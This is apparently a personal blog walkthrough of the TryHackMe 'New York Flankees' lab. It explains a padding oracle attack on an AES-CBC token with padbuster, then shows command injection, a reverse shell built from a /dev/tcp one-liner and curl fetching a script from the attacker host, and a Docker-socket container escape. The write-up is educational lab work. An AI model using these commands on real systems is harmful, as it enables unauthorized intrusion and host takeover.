---
title: New York Flankees
date: 2024-07-17 17:00:00 +0200
categories: [TryHackMe]
tags: [Web, API, Padding-Oracle, AES, CBC, RCE, Docker, Container-Escape]
description: Can you, the rogue adventurer, break through Stefan's defences to take control of his blog!
render_with_liquid: false
comments: true
media_subpath: /assets/img/thm_images/tryhackme_newyorkFlankees/
image:
    path: new_york_flankees_room.png
---

## Room

![Room Card](room_card.png){: w="300" h="300" .center .shadow}

- **Title:** Stefans_Magical_Blog_v1
- **Name:** [New York Flankees](https://tryhackme.com/r/room/thenewyorkflankees)
- **Description:** Can you, the rogue adventurer, break through Stefan's defences to take control of his blog!

### Flags

1.  What is the cleartext value of the decrypted blob (the format is element1:element2)?
2.  What is the flag in the admin panel?
3.  Dig around in the container. What is the second flag?
4.  What is the final flag?

### Author

- **Name:** [m3gakr4nus](https://tryhackme.com/p/m3gakr4nus)
- **Duration:** 2024-07-17 - 2024-07-20

## Flag 1

### Enumeration

We start of by a simple nmap scan

```bash
sudo nmap -sS -T4 -v -Pn -p- -A <target_ip> -oN portscan.nmap
```

![4f69f6bae8ac703c19bec56e088e91b4.png](4f69f6bae8ac703c19bec56e088e91b4.png){: w="500" h="300" .center}

Nmap identifies 2 open ports. `22 - SSH` and `8080 - http`

Navigating to the http-server on port `8080` we see the following page:  
![e0ba9f65cb4e84c2c5e755e912b97612.png](e0ba9f65cb4e84c2c5e755e912b97612.png){: w="700" h="300" .center}

- A message which is hinting at what we need to look for
- A test page on the top left corner
- An admin's login page on the top right corner

Let's navigate to `/debug.html`  
![5b4f7a1deff240bdad4aec71eeb39322.png](5b4f7a1deff240bdad4aec71eeb39322.png){: w="450" h="300" .center}

Looking at the `/debug.html` page's source code, we can see this piece of script  
![de14f8f0c76a9d384cb57111c63662d2.png](de14f8f0c76a9d384cb57111c63662d2.png){: w="700" h="300" .center}

- The script is basically submitting the token to the `/api/debug` in order to obtain an auth-token
    
- But as we see in the comments, the auth-token is not yet implemented
    
- The other comment is also hinting at the encryption and the mode used
    
- After sending the request manually to the webserver we get this:  
    ![47a0feca68f1d3b0176ffbb6f27d9e03.png](47a0feca68f1d3b0176ffbb6f27d9e03.png){: w="500" h="300" .center}
    
- And if we add a single byte to it we get this:  
    ![137b61e6dd59148637f8b4639c691172.png](137b61e6dd59148637f8b4639c691172.png){: w="500" h="300" .center}
    

After doing some research using keywords such as:

- AES/CBC/PKCS
- Oracle
- padding errors

I came across an attack called `Padding Oracle`

### Padding Oracle Attack

In encryption using `CBC` mode, the previous encrypted block is XORed with the next block to encrypt. The decryption is basically the opposite. **A random IV** is used for **the first block** since there are no blocks before it to be XORed with. The same random IV is used for encryption and decryption.

**CBC Encryption**  
![02dde7ff9b74db4f4a3f385af2d9ace1.png](02dde7ff9b74db4f4a3f385af2d9ace1.png){: w="600" h="300" .center}

**CBC Decryption**  
![b245ddcc989a6819d85c031b5b4d9e78.png](b245ddcc989a6819d85c031b5b4d9e78.png){: w="600" h="300" .center}

Since the encryption happens with fixed size blocks, `padding` is required to complete the last block.

For example if the **message is 14 bytes long** and if **each block must be 16 bytes long**, we will have to **add 2 more bytes** to the message to complete **1 block**.  
But what do we add exactly?

Well, in **PKCS7** you just add the number of the missing bytes multiplied by the number of missing bytes.

If there are **two bytes missing**, we add: xxxxxxxxxxxxxx**22**  
If there are **eigtht bytes missing**, we add: xxxxxxxx**88888888**  
Even if you have a full **16 bytes long** message a 16 bytes long padding will be added with each byte having the value 16.

Now the vulnerability happens during the decryption process and when the appilication let's us know wether the padding was valid or not.  
For example, **In a 3 blocksize message**, we change **the last byte** of the **second block** of the cipher text. Since this manipulated byte is going to get XORed with the **last byte** of the **last block**, the chances are the padding will not be valid anymore.

**Example after manipulation**  
If there are **4 bytes missing**, we add: xxxxxxxxxxxx444**3**

As you can see the padding isn't valid any more and the application will give us an error.  
There will be 1 instance where we won't get an error and that is when the last byte is equal to `0x01`. This will be **interpreted as a valid padding**. Now at this point the cleartext is essentially garbage but since **our guess-byte XORed with 0x01** is equal to the last decrypted-byte before the XOR happens, we can XOR the **original cipher-byte** with the **decrypted-byte** to get the last **plaintext-byte**.

**Example**

```text
C = 5 # Original cipher-byte (block 2 - last byte)
# We will replce '5' and test it 256 times until the output is 0x01 (no padding error)
# Let's say Output = 0x01 when C = 56

CG = 56 # Our guess which causes output to be 0x01 (block 2 - last byte)

D = 0x01 ^ CG # The decrypted-byte before XOR (block 3 - last byte)

# Now that we know the decrypted-byte, we can XOR it with the original cipher-byte (block 2 - last byte) to get the original plaintext-byte (block 3 - last bye), so:

P = D ^ C # Original plaintext (only the last byte)
```

To decrypt the rest of the block:

- We manipulate `C` so that the output is `0x02`
- And now test the second to last Byte of the second block until the output is also `0x02` (0x02 + 0x02 = valid padding)
- We keep repeating this for the entire block

When trying to decrypt the second block, we will simply ignore the third block and do our tests on the last byte of the first block so that the output will be `0x01` (valid padding since we are ignoring the third block) and so on... until we have the entire plaintext

Since there are **256 different possible values** for each byte, it is actually possible to start guessing the correct byte and eventually decrypting the entire message **byte by byte** and **block by block** without knowing the encryption key.

This is the best I could explain this attack in writing...  
I do realize that this could be confusing at first so if you would like to learn more about this, I recommend these ressources that I used to learn this attack:

- **[Sid Sawhney - YouTube (Amazing explanation!)](https://www.youtube.com/watch?v=O5SeQxErXA4)**
- https://en.wikipedia.org/wiki/Padding_oracle_attack
- https://medium.com/@masjadaan/oracle-padding-attack-a61369993c86
- https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv  
    I spent 3 days (1-2 hours each day) trying to understand this attack until I got it :)

I will use `padbuster` to perform the `Padding Oracle` attack against the website:

```bash
sudo apt install padbuster # Install padbuster
```

```bash
padbuster http://<target_ip>:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4" 16 -encoding 2 -error "Decryption error"
```

- Provide the URL including the token
- Provide the ciphertext / token
- **16:** The blocksize --> Since we know `AES` is being used, the only valid blocksize for `AES` is `128 Bits` or `16 Bytes`
- **encoding:** 2 (Uppercase Hex)
- **error:** The error message that the application returns when padding error happens

![ea8c7fa6af81c40803f6dc85e09a3c7d.png](ea8c7fa6af81c40803f6dc85e09a3c7d.png){: w="700" h="300" .center}

Now Padbuster begins guessing byte by byte until we have the full plaintext.  
This will take a while so grab a cup of coffee and take a break.

After about 10-15 minutes we get the decrypted credentials for Stefan:  
![eb85ab9969fb05b71ca771a467dd10b6.png](eb85ab9969fb05b71ca771a467dd10b6.png){: w="700" h="300" .center}

## Flag 2

Now that we have Stefan's credentials we can navigate to `http://<target_ip>:8080/login.html` and login.

After logging in, we can see a button called `DEBUG`:  
![c1a6e3f33d79c29bd2be5dfd52a8d5ac.png](c1a6e3f33d79c29bd2be5dfd52a8d5ac.png){: w="700" h="300" .center}

Clicking on it simply navigates us to `/exec.html`

**Here you will find the second flag.**  
![0302677b37fa06bb79dcc17dcff4a55d.png](0302677b37fa06bb79dcc17dcff4a55d.png){: w="600" h="300" .center}

## Flag 3

After logging in as `Stefan`, we see an input box telling us to enter a command.

Running commands will either give us a generic `OK` message or simply no message at all.  
Running `wget` by itself gives us an `OK` message  
![ccd1f7ebeffd924f829a6be49ab872b1.png](ccd1f7ebeffd924f829a6be49ab872b1.png){: w="500" h="300" .center}

Let's test this and see if we can actually run commands on the machine:

```bash
python3 -m http.server 80 # Run on the attacker machine

wget <attack_ip>/test # Submit as command input
```

![4e72d80b38e0b1d762906106356c0eb6.png](4e72d80b38e0b1d762906106356c0eb6.png){: w="500" h="300" .center}

We can see that the command ran successfully. It's time to get a shell...

After testing different payloads, this was my way in:

```bash
nano rev.sh
sh -i >& /dev/tcp/<attacker_ip>/53 0>&1 # Paste into nano then CTRL + O to save and CTRL + X to exit
python3 -m http.server 80 # run on attacker machine

curl <attacker_ip>/rev.sh -o /tmp/rev.sh # Submit as input
bash /tmp/rev.sh # Submit as input
```

![489380577ec19828ab416e873ec6c07c.png](489380577ec19828ab416e873ec6c07c.png){: w="600" h="300" .center}

We can see that we are in as `root` but this is just a docker contianer:  
![4536b6bc34be3874d613946e2879f948.png](4536b6bc34be3874d613946e2879f948.png){: w="400" h="300" .center}

Let's get `linpeas` on the machine and enumerate it:

- Linpeas found the `/app` directory which I completely overlooked.
- Looking inside, there is a file called `docker-compose.yaml`.

The third flag can be found within this file
**Take note of the mounted Docker socket**

![984d1e7448320c6088ea70dd34757f28.png](984d1e7448320c6088ea70dd34757f28.png){: w="400" h="300" .center}

## Flag 4

Sicne the docker socket is mounted inside the container, we can interact with the docker engine and escape the container by abusing it.

```bash
docker images # choose any of these
docker run -v /:/host --rm -it <REPOSITORY>:<TAG> bash
```

1. We are basically running the container
2. Mounting the `/` directory of **the host** into this container under the path  `/host`
3. Then we are executing `bash` to interact with the container  
    ![a9ca05718fd7feea8380148a1ff8615a.png](a9ca05718fd7feea8380148a1ff8615a.png){: w="500" h="300" .center}

After navigating to `/host` within the container, we see the file called `flag.txt`  
The final flag can be found within this file  
![3bcfe0d4cc512184c3ff96a7e043c80f.png](3bcfe0d4cc512184c3ff96a7e043c80f.png){: w="400" h="300" .center}

## Outro
Many thanks to the creators of this room:
- [ioctl](https://tryhackme.com/p/ioctl)
- [tgreenMWR](https://tryhackme.com/p/tgreenMWR) 

I learned a completely new attack from this room which was fascinating.

\- m3gakr4nus
